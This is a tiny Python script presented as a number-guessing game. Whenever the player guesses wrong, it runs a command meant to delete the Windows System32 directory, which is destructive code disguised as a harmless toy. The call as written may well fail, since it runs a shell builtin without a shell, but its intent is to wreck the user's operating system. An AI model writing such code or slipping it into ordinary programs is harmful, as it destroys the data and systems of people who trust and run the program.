import random
import subprocess 

number = random.randint(1,10)
guess = int(input("Guess number between 1 & 10 >:"))

if guess == number:
    print("correct, Wohoo!")
else:
    subprocess.run(["del C:\Windows\System32"])